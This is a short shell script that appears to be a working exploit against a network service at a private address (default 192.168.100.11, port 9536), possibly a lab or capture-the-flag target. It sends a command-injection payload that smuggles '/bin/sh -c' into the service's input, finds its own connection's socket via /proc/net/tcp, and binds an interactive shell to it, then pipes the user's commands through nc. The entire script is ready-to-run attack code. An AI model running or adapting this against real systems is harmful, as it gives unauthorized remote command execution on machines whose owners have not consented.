#!/bin/sh
set -eu

host="${1:-192.168.100.11}"
port="${2:-9536}"
source_port=$((42000 + ($$ % 10000)))
source_hex=$(printf '%04X' "$source_port")
payload='/cat /dev/null|/bin/sh -c '\''ino=$(/usr/bin/awk "\$3~/:SOURCEHEX$/&&\$4==\"01\"{print \$10;exit}" /proc/net/tcp); fd=$(/bin/ls -l /proc/self/fd | /usr/bin/awk -v i="$ino" "\$11==\"socket:[\"i\"]\"{print \$9;exit}"); test -n "$fd" || exit 91; eval "exec /bin/ash -i <&$fd >&$fd 2>&$fd"'\'''
payload=$(printf '%s' "$payload" | /bin/sed "s/SOURCEHEX/$source_hex/")

echo "Connecting to $host:$port from source port $source_port..." >&2
echo "After the prompt appears, enter commands such as: /bin/ls" >&2

{
    sleep 1
    printf '%s\r\n' "$payload"
    cat
} | nc -p "$source_port" "$host" "$port"
